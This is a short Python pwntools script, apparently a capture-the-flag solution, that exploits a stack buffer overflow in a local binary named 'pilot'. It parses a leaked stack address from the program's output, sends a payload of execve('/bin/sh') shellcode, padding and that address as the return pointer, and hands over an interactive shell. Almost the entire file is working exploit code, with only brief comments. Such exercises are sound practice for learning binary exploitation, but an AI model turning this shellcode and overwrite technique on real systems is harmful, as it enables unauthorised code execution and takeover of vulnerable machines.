#!/usr/bin/python3
from pwn import *

# execve /bin/sh
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

# write 28 then rp, but part of that 28 is the shellcode
bufsz = 0x28 - len(sc)

r = process('./pilot')

r.recvuntil(b'ation:0x')

# get the stack pointer to our buffer
rp = r.recvuntil(b'\n')
rp = p64(int(rp,16))

# payload is shellcode, then trash, then return pointer
payload = sc + b"A"*bufsz + rp

# send it
r.sendline(payload)

# profit from your shell
r.interactive()
